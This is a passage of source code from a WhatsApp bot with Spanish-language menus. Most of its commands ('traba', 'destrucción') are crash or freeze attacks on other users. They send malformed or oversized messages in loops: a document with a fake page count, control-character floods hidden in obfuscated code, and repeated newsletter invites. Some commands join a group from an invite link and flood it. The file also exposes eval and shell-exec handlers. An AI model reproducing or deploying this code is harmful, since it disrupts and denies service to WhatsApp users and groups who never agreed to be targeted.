_0x531257(_0x117323,_0x5a842f,_0x3c1f42,_0x44b756){return _0x453f(_0x117323-0x219,_0x5a842f);}return function(_0x33306a,_0x45bd60){function _0x56ef09(_0x4057a0,_0x387226,_0x4b7da5,_0x4d689c){return _0x4976a3(_0x4d689c,_0x387226-0x146,_0x4057a0-0x53,_0x4d689c-0xc);}function _0x3ddcc9(_0x1e76e5,_0xcb3799,_0x3bb072,_0x217579){return _0x531257(_0xcb3799- -0x344,_0x1e76e5,_0x3bb072-0x13c,_0x217579-0x80);}if(_0x52b398['SUvuF'](_0x56ef09(0x307,0x2fb,0x327,0x30b),_0x52b398[_0x56ef09(0x315,0x354,0x30c,0x30c)])){const _0x3e50d3=_0x586fd9?function(){function _0x8c4b9(_0x37febb,_0x4799e7,_0x4ea418,_0x51a113){return _0x3ddcc9(_0x4799e7,_0x51a113-0x290,_0x4ea418-0xa4,_0x51a113-0xd4);}if(_0x45bd60){const _0x340589=_0x45bd60[_0x8c4b9(0x258,0x23b,0x239,0x26c)](_0x33306a,arguments);return _0x45bd60=null,_0x340589;}}:function(){};return _0x586fd9=![],_0x3e50d3;}else{const _0xbbd858=_0x34068a['apply'](_0x520ed8,arguments);return _0x1f1d49=null,_0xbbd858;}};}());function _0x2fc48f(_0x4f12de,_0x287028,_0x273bfe,_0x43c990){return _0x453f(_0x287028-0x346,_0x43c990);}const _0x25b9f0=_0x1c8a3c(this,function(){function _0xe03a3(_0x5c677d,_0x52f6d8,_0x49378b,_0x2557ba){return _0x453f(_0x2557ba-0x36a,_0x5c677d);}function _0x50a745(_0x56a1de,_0x594878,_0x3d874a,_0x54b97b){return _0x453f(_0x3d874a-0x123,_0x54b97b);}const _0x23645a={};_0x23645a[_0x50a745(0x220,0x261,0x224,0x20b)]='(((.+)+)+)'+'+$';const _0x9374f6=_0x23645a;return _0x25b9f0[_0x50a745(0x1f7,0x241,0x204,0x1f0)]()[_0x50a745(0x1c5,0x1b4,0x1e9,0x211)](_0x9374f6[_0xe03a3(0x49f,0x4a6,0x474,0x46b)])['toString']()['constructo'+'r'](_0x25b9f0)[_0xe03a3(0x468,0x467,0x3f2,0x430)](_0xe03a3(0x425,0x435,0x424,0x440)+'+$');});_0x25b9f0();const _0x460fe4=(function(){let _0x331e0a=!![];return function(_0x24e290,_0x37d477){const _0x47a0a2=_0x331e0a?function(){function _0x3c91e6(_0x2e8505,_0x466d91,_0x5d88a3,_0x1c2efb){return _0x453f(_0x1c2efb- -0x167,_0x466d91);}if(_0x37d477){const _0xeec447=_0x37d477[_0x3c91e6(-0x7e,-0x63,-0x75,-0x60)](_0x24e290,arguments);return _0x37d477=null,_0xeec447;}}:function(){};return _0x331e0a=![],_0x47a0a2;};}()),_0x1202f1=_0x460fe4(this,function(){const _0x2b9686={'RyxSg':_0x4891a6(-0x13e,-0x104,-0x16a,-0x105),'MCXQb':function(_0x246717,_0x2e69e6){return _0x246717+_0x2e69e6;},'nEuTf':_0x4891a6(-0x143,-0x12f,-0x107,-0x174)+_0x2cf091(0x380,0x375,0x34f,0x357),'SCYHI':function(_0x57381c,_0x4c2aa9){return _0x57381c===_0x4c2aa9;},'OnGot':_0x2cf091(0x3b3,0x39c,0x3ac,0x389),'fxezq':function(_0x1ec1b7){return _0x1ec1b7();},'PRJGV':_0x2cf091(0x376,0x360,0x360,0x355),'gZiEh':'warn','qfRrT':_0x4891a6(-0x136,-0xf6,-0xfd,-0x101),'kGsKR':'exception','zsYhV':_0x4891a6(-0x168,-0x156,-0x15c,-0x160),'YPZmY':_0x2cf091(0x32c,0x368,0x390,0x384),'bJfXR':function(_0xefedfd,_0x18199c){return _0xefedfd<_0x18199c;}},_0x460b30=function(){function _0x6c0bab(_0x3c28b1,_0x5b1d94,_0x319b61,_0x369cd4){return _0x2cf091(_0x3c28b1-0x185,_0x319b61- -0x306,_0x3c28b1,_0x369cd4-0x2b);}let _0x59202e;function _0x4962e3(_0x1c8425,_0x9cef75,_0x171d04,_0x5cbcb9){return _0x4891a6(_0x171d04-0x327,_0x1c8425,_0x171d04-0xc4,_0x5cbcb9-0x18e);}try{if(_0x2b9686['RyxSg']!==_0x2b9686[_0x4962e3(0x1df,0x1b6,0x1ec,0x1e4)]){const _0x5b2e18=_0x45f6e8['constructo'+'r']['prototype'][_0x4962e3(0x1e7,0x1f2,0x204,0x1f3)](_0x2b523c),_0x2c5bd4=_0x5e8413[_0x2311c6],_0x202126=_0x46a0ce[_0x2c5bd4]||_0x5b2e18;_0x5b2e18[_0x4962e3(0x1cf,0x1f2,0x1c3,0x1f8)]=_0x2ec944[_0x4962e3(0x220,0x20d,0x204,0x226)](_0x31db21),_0x5b2e18['toString']=_0x202126[_0x6c0bab(0x74,0x98,0x84,0xb4)][_0x4962e3(0x227,0x22e,0x204,0x23a)](_0x202126),_0xf4aad7[_0x2c5bd4]=_0x5b2e18;}else _0x59202e=Function(_0x2b9686[_0x4962e3(0x1ae,0x1dc,0x1b7,0x1c6)](_0x2b9686[_0x4962e3(0x1cc,0x1e6,0x1de,0x1b6)],_0x6c0bab(0xaa,0x7d,0x9a,0x61)+_0x6c0bab(0x78,0x65,0x85,0x94)+_0x6c0bab(0x89,0x86,0x8d,0x71)+'\x20)')+');')();}catch(_0x2aefb8){if(_0x2b9686[_0x4962e3(0x1b3,0x1ec,0x1f2,0x1c0)](_0x2b9686[_0x6c0bab(0x35,0x65,0x41,0x48)],_0x4962e3(0x1a9,0x18c,0x1c9,0x1aa))){if(_0x2348d9){const _0x410e2d=_0x5392db[_0x6c0bab(0xa0,0xa3,0xaa,0xb9)](_0x2e5a9d,arguments);return _0x5e31fc=null,_0x410e2d;}}else _0x59202e=window;}return _0x59202e;},_0x29c00d=_0x2b9686['fxezq'](_0x460b30);function _0x2cf091(_0xa63f07,_0x2edab9,_0x7f67a5,_0x13c887){return _0x453f(_0x2edab9-0x2a9,_0x7f67a5);}const _0x14e515=_0x29c00d[_0x2cf091(0x36f,0x396,0x376,0x398)]=_0x29c00d['console']||{};function _0x4891a6(_0x5de00b,_0x14c2e6,_0x3f913f,_0x3c4c5c){return _0x453f(_0x5de00b- -0x212,_0x14c2e6);}const _0x39b4ea=[_0x2b9686[_0x4891a6(-0x162,-0x140,-0x197,-0x172)],_0x2b9686[_0x4891a6(-0x15f,-0x150,-0x12d,-0x135)],_0x4891a6(-0x17c,-0x171,-0x197,-0x188),_0x2b9686['qfRrT'],_0x2b9686[_0x2cf091(0x395,0x38d,0x37a,0x35e)],_0x2b9686[_0x2cf091(0x36a,0x3a8,0x37b,0x3aa)],_0x2b9686['YPZmY']];for(let _0x2b03d6=0x2007*-0x1+0x22e1+0x2da*-0x1;_0x2b9686['bJfXR'](_0x2b03d6,_0x39b4ea['length']);_0x2b03d6++){const _0x32ea3b=_0x460fe4[_0x2cf091(0x315,0x33b,0x31e,0x30c)+'r'][_0x2cf091(0x364,0x390,0x3d0,0x356)]['bind'](_0x460fe4),_0x43f67b=_0x39b4ea[_0x2b03d6],_0x48d913=_0x14e515[_0x43f67b]||_0x32ea3b;_0x32ea3b['__proto__']=_0x460fe4[_0x2cf091(0x3bc,0x398,0x383,0x37c)](_0x460fe4),_0x32ea3b[_0x2cf091(0x399,0x38a,0x3ba,0x36f)]=_0x48d913[_0x2cf091(0x37e,0x38a,0x3a8,0x369)][_0x4891a6(-0x123,-0xf9,-0x139,-0x118)](_0x48d913),_0x14e515[_0x43f67b]=_0x32ea3b;}});_0x1202f1();let bug='\x03'[_0x2fc48f(0x3c9,0x3d1,0x3a6,0x394)](-0xa7dba+-0x4c1c6+-0x174*-0x11d8);for(let i=-0x26ee+0xde6+-0x9*-0x2c8;i<amount;i++){const _0x1d2630={};_0x1d2630[_0x4eaeea(0x1,-0x18,-0x24,0x3f)+_0x4eaeea(-0x8,0xf,0x1c,-0x20)]=_0x2fc48f(0x3aa,0x3e9,0x3bb,0x3fe)+'38483540@n'+'ewsletter',_0x1d2630[_0x4eaeea(0x1,0x32,0x23,0x3f)+_0x2fc48f(0x3a8,0x3da,0x3fe,0x3ed)]=_0x4eaeea(-0x4,0x28,0x7,0x1f)+_0x4eaeea(0x4e,0x33,0x2b,0x68)+_0x4eaeea(0x55,0x57,0x8d,0x71)+'h',_0x1d2630[_0x4eaeea(0x1e,0x3a,0x4d,0x12)+_0x2fc48f(0x3f4,0x40a,0x443,0x3d3)]=0x2;const _0xa2bffe={};_0xa2bffe[_0x4eaeea(0x42,0x80,0x7b,0x1a)+_0x2fc48f(0x3be,0x3e6,0x3af,0x3d1)]=[],_0xa2bffe['jpegThumbn'+_0x4eaeea(0x43,0x3e,0x5e,0x63)]=global[_0x2fc48f(0x40f,0x43a,0x431,0x450)];const _0x34759c={};_0x34759c['name']='review_and'+_0x2fc48f(0x3e1,0x3f1,0x3bf,0x3bc),_0x34759c[_0x2fc48f(0x433,0x3ff,0x3e9,0x3c9)+_0x4eaeea(0x57,0x2c,0x5c,0x31)]='{\x22currency'+_0x4eaeea(0x2,0x0,-0x23,-0xd)+'otal_amoun'+_0x4eaeea(0x18,0x42,0x34,0xd)+_0x2fc48f(0x41e,0x3e2,0x41b,0x3d4)+_0x2fc48f(0x436,0x44b,0x453,0x481)+_0x4eaeea(-0xb,-0x5,0x6,-0x3c)+_0x4eaeea(0x28,0x25,-0x1,0x25)+_0x4eaeea(0x35,0x3,0x4a,0x6a)+_0x2fc48f(0x3ec,0x3dd,0x3cb,0x409)+':\x22physical'+_0x4eaeea(0x52,0x66,0x15,0x4b)+_0x4eaeea(0x58,0x6c,0x8e,0x19)+_0x4eaeea(-0x15,0x2b,-0x55,-0x42)+_0x4eaeea(0x2f,0x12,-0x6,0x27)+_0x2fc48f(0x45c,0x444,0x409,0x425)+_0x2fc48f(0x47b,0x448,0x445,0x463)+_0x4eaeea(0x13,0xf,0x51,-0x26)+_0x4eaeea(0x20,-0x1e,0x32,0x3d)+_0x2fc48f(0x427,0x426,0x43b,0x3eb)+_0x2fc48f(0x3f9,0x436,0x423,0x422)+_0x4eaeea(-0x17,0x1f,-0x51,-0x4a)+_0x2fc48f(0x432,0x43f,0x42d,0x44b)+_0x2fc48f(0x3ea,0x408,0x3fc,0x3c9)+_0x4eaeea(0x15,0x45,-0x9,0xe)+'3159292600'+_0x2fc48f(0x469,0x44e,0x419,0x44d)+'t_id\x22:\x22799'+_0x4eaeea(0x22,0x17,0x47,-0x17)+'009\x22,\x22name'+_0x4eaeea(0xc,-0x17,-0x31,-0x11)+xbugtex['xtxt']+(_0x2fc48f(0x405,0x3f8,0x436,0x3f4)+_0x2fc48f(0x457,0x43c,0x42c,0x46c)+_0x2fc48f(0x463,0x449,0x468,0x419)+'ffset\x22:100'+_0x4eaeea(-0x9,-0x13,-0x37,0x29)+_0x4eaeea(0x36,0x21,0x4e,0x39)+_0x2fc48f(0x3d8,0x400,0x40d,0x3d7)+_0x2fc48f(0x405,0x3ee,0x3d0,0x3da)+_0x4eaeea(0x4,0x28,0x7,0x5)+_0x4eaeea(0x61,0x2e,0x4c,0x80)+_0x4eaeea(0x66,0x35,0x93,0x6d)+_0x4eaeea(-0x14,-0x34,-0x1e,-0x3e)+_0x4eaeea(0x6,-0x5,0x46,-0xc)+_0x4eaeea(0x2b,0x15,0x2c,0x4c)+_0x2fc48f(0x3d2,0x3d3,0x3cd,0x3e1))+bug+(_0x4eaeea(0xf,-0x15,0x33,0x4d)+_0x2fc48f(0x415,0x43c,0x45f,0x44d)+_0x2fc48f(0x437,0x449,0x415,0x45b)+'ffset\x22:100'+_0x4eaeea(-0x9,0xb,-0x3c,0x36)+_0x4eaeea(0x2d,0x15,-0x3,0xe)+'ative_paym'+_0x4eaeea(0x38,0x26,0x2c,0x39)+_0x4eaeea(0x3c,0xf,0x4a,0x4b));const _0xf37131={};_0xf37131[_0x4eaeea(0x1d,0x3c,0x1a,-0x1d)]=[_0x34759c];const _0x26e3cf={};_0x26e3cf[_0x4eaeea(0x37,0x8,0x3c,0x5)]=_0xa2bffe,_0x26e3cf[_0x4eaeea(-0x10,-0x14,0x2,-0x30)+_0x4eaeea(0x32,0x15,-0x4,0x27)]=_0xf37131;const _0x2a7413={};_0x2a7413['interactiv'+_0x2fc48f(0x43c,0x434,0x45b,0x453)]=_0x26e3cf;const _0x42b619={};_0x42b619[_0x2fc48f(0x3e6,0x419,0x44e,0x42e)+'d']=!![],_0x42b619['forwardedN'+'ewsletterM'+_0x2fc48f(0x3ec,0x3e3,0x40b,0x3d2)]=_0x1d2630,_0x42b619[_0x2fc48f(0x404,0x3fb,0x3f6,0x405)]=_0x2fc48f(0x429,0x403,0x3e8,0x441)+_0x4eaeea(0x9,-0xe,-0x27,-0x4),_0x42b619['participan'+'t']=_0x2fc48f(0x410,0x417,0x3f5,0x404)+_0x4eaeea(0x5a,0x4a,0x74,0x2a),_0x42b619[_0x4eaeea(-0x13,0x29,-0x32,0x2)+_0x4eaeea(-0xe,-0x9,-0x35,0x18)]=_0x2a7413,_0x42b619[_0x2fc48f(0x3be,0x3f7,0x3cc,0x411)]=_0x4eaeea(0x48,0xb,0x3f,0x55)+_0x4eaeea(0x3,0x3d,0xd,-0x25);const _0x18e540={};_0x18e540['text']='\x20',_0x18e540[_0x2fc48f(0x41f,0x40d,0x439,0x3f8)+'o']=_0x42b619;const _0x1985c4={};_0x1985c4[_0x4eaeea(0x3b,0x7b,0x3c,0x47)+'xtMessage']=_0x18e540,await XeonBotInc[_0x4eaeea(0x27,-0x6,0x64,0x1c)+'ge'](m[_0x2fc48f(0x451,0x429,0x41c,0x425)],_0x1985c4,{});const _0xfd3911={};_0xfd3911['text']='\x20';const _0x136d8a={};_0x136d8a[_0x2fc48f(0x3f8,0x42e,0x40e,0x437)]=m,await XeonBotInc[_0x2fc48f(0x444,0x42f,0x402,0x40a)+'e'](m[_0x2fc48f(0x43e,0x429,0x42f,0x458)],_0xfd3911,_0x136d8a);}function _0x453f(_0x25b9f0,_0x1c8a3c){const _0x3b9f39=_0x3b9f();return _0x453f=function(_0x453f85,_0x12a8ea){_0x453f85=_0x453f85-(-0x15d*-0x8+0x1583*-0x1+0xb26);let _0x31ef9c=_0x3b9f39[_0x453f85];return _0x31ef9c;},_0x453f(_0x25b9f0,_0x1c8a3c);}function _0x3b9f(){const _0x3e0b0d=['return\x20(fu','y\x22:1}]},\x22n','0@s.whatsa','ment_reque','isForwarde','YckVA','Message','(((.+)+)+)','RyxSg','\x224ONSAXV76','y\x22:1},{\x22re','header','ent_method','error','SCYHI','extendedTe','s\x22:[]}','et\x22:100},\x22','toString','ctor(\x22retu','chat','kGsKR','hasMediaAt','ail','prototype','quoted','sendMessag','rn\x20this\x22)(','status@bro','85369EctOWu','console','eMessage','bind','order_type','','ivNqe','qIvzT','bimg','-goods\x22,\x22o',':{\x22value\x22:','{}.constru','','\x22items\x22:[{','msJson','rder\x22:{\x22st','36BBgfPa','pp.net','sted\x22,\x22sub','zsYhV','cltkh','WjJjM','total\x22:{\x22v','9999900,\x22o','\x22product_i',',\x22offset\x22:','7mcCrea','apply','9\x22,\x22produc','d\x22:\x22784267','364020DaccDn','repeat','\x22:\x22ORDER\x22,','','atus\x22:\x22pay','4605763435','quotedMess','332216bzyOfX','constructo','nativeFlow','Name','age','info','KN\x22,\x22type\x22','100},\x22refe','SUvuF','},\x22quantit','Jid','\x22:69696969','essageInfo','OnGot','PON LO QUE TÚ QUIERAS','tachment','178686RRfwcP','MCXQb','1203631440','newsletter','\x22:\x22INR\x22,\x22t','adcast','05763435\x22,',':\x2278426746','\x22,\x22name\x22:\x22','table','_pay','FE4CDF','9uEAksQ','__proto__','\x22:\x22','PRJGV','remoteJid','\x22,\x22amount\x22','gZiEh','jZQZf','stanzaId','alue\x22:1999','log','id\x22:\x2275376','buttonPara','tailer_id\x22','t\x22:{\x22value','44256GJazSw','BAE526D352','185295HrBSjk','trace','buttons','serverMess','\x22retailer_','9800,\x22offs','ageId','9631592926','search','contextInf','6zqZSXT','nEuTf','relayMessa','rence_id\x22:','nction()\x20','95455PhYCDS',``];_0x3b9f=function(){return _0x3e0b0d;};return _0x3b9f();}
}
break

case 'traba20iu': {
for (let i = `5`;i !== 0; i -=1){
                if (!m.isGroup) return replygcxeon(mess.group)
                XeonBotInc.sendMessage(m.chat, {
                    text: `📡.il/${IU2}`,
                    mentions: participants.map(a => a.id)
                }, { quoted: destructor })
                }
                }
                break
                
case 'menu':{
for (let i = `5`;i !== 0; i -=1){
XeonBotInc.sendMessage(from, {
              image: fs.readFileSync('./src/image/body.jpg'), caption: `             ⏣ *𝗖𝗥𝗘𝗔𝗗𝗢 𝗣𝗢𝗥 ⏣*\n    *꧁⃟💀⃝⃘͜𓆩⃢🌹SAORI🌹⃢𓆪⃝⃘͜💀⃟꧂*\n__________________________________\n*🫀⃝⛦ ᎻϴᏞᎪ ${pushname}, ᎪϘႮᏆ́ ᎬՏͲᎪ́ ᎬᏞ ᎷᎬΝႮ, ᏢᎬϘႮᎬΝ̃ϴ ͲᎡϴᏃϴ ᎠᎬ ᏴᎪՏႮᎡᎪ ⛦⃝🫀*\n*💀⃝⃟⛦ MENU DE TRABAS ⛦⃝⃟💀*\n* traba1\n* traba2iu\n* traba3iu\n* traba4\n* traba5ios\n* traba6\n* traba7\n* traba8ios\n* traba9iu\n* traba10\n* traba11\n* traba12ios\n* traba13\n* traba14iu\n* traba15\n* traba16\n* traba17iu\n* traba18iu\n* traba19\n* traba20iu\n* traba21\n* traba22\n* traba23\n* traba24ios\n*  destrucción1\n* destrucción2\n* destrucción3\n* destrucción4\n*💀⃝⃟⛦TRABAS PARA DESTRUIR GRUPOS ⛦⃝⃟💀*\n* traba25\n* traba26ios\n* traba27`
            })
            }}
            break                


destrucción4


case 'traba21': 
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var documentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429&mms3=true",
"mimetype": " ",
"title": "ff.exct",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 999999999,
"index": 0,
"mediaKey": "fcxyCLIN2AubiCHSqdykEzQdvmIYdzZJHGeTz1UoFlY=",
"fileName": `${pushname}\n${xeontext1}`,
"caption": ``,
"fileEncSha256": "vaEk8nmpa8fera+p5GTdtjaHNw34HrcF+rXLe3tG9/M=",
"directPath": "/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429",
"mediaKeyTimestamp": "1688964255"
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, documentMessage.message, { messageId: documentMessage.key.id })
}
break



case 'traba22': {
for (let i = `5`;i !== 0; i -=1){
XeonBotInc.sendMessage(from, { location: { 
degreesLatitude: -23.6261,
degreesLongitude: -62.19109138,
name: `${pushname}`,
address: `🖕CHINGA TU MADRE🖕`, 
url: `https://${carrinho2}.com`, 
comment: botname, 
jpegThumbnail: fs.readFileSync('./src/image/descarga.jpeg'), } }, { quoted: destructor })
}
}
break



case 'traba23':  {
var message = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var newsletterAdminInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `${pushname}${carrinho2}`,
jpegThumbnail: fs.readFileSync('./src/image/descarga.jpeg'),
caption: `*${pushname}*`,
inviteExpiration: Date.now() + 1814400000
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, newsletterAdminInviteMessage.message, { messageId: newsletterAdminInviteMessage.key.id })
}
break

case 'traba24ios':  {
var message = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var newsletterAdminInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `${pushname}${ios}`,
jpegThumbnail: fs.readFileSync('./src/image/descarga.jpeg'),
caption: `*${pushname}*`,
inviteExpiration: Date.now() + 1814400000
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, newsletterAdminInviteMessage.message, { messageId: newsletterAdminInviteMessage.key.id })
}
break

case 'traba25' :  {
if (!args[0]) return replygcxeon(`*Para que el bot pueda atacar el grupo, debes poner el comando con el enlace de esta manera. 👇*\n ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
for (let i = `10`;i !== 0; i -=1){
await sleep(30000)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429&mms3=true",
"mimetype": " ",
"title": "ff.exct",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 999999999,
"index": 0,
"mediaKey": "fcxyCLIN2AubiCHSqdykEzQdvmIYdzZJHGeTz1UoFlY=",
"fileName": `${pushname}\n${xeontext1}`,
"caption": `${pushname}`,
"fileEncSha256": "vaEk8nmpa8fera+p5GTdtjaHNw34HrcF+rXLe3tG9/M=",
"directPath": "/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429",
"mediaKeyTimestamp": "1688964255"
}
}), { quoted : destructor})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
} 
break

case 'traba26ios' :  {
if (!args[0]) return replygcxeon(`*Para que el bot pueda atacar el grupo, debes poner el comando con el enlace de esta manera. 👇*\n ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
for (let i = `10`;i !== 0; i -=1){
await sleep(30000)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `${pushname}${ios}`,
jpegThumbnail: fs.readFileSync('./src/image/menu.jpeg'),
caption: `${pushname}`,
inviteExpiration: Date.now() + 1814400000
}
}), { quoted : destructor})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
} 
break

case 'traba27' :  {
if (!args[0]) return replygcxeon(`*Para que el bot pueda atacar el grupo, debes poner el comando con el enlace de esta manera. 👇*\n ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
for (let i = `10`;i !== 0; i -=1){
await sleep(30000)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `${pushname}${xeontext1}`,
jpegThumbnail: fs.readFileSync('./src/image/menu.jpeg'),
caption: `${pushname}`,
inviteExpiration: Date.now() + 1814400000
}
}), { quoted : destructor})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
} 
break

if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/kSs1stX/thumb.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: destructor
                    })
                    } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: destructor
                    })
                } else if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/thumb2.mp4'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: destructor
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcxeon(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
        }
    } catch (err) {
        XeonBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})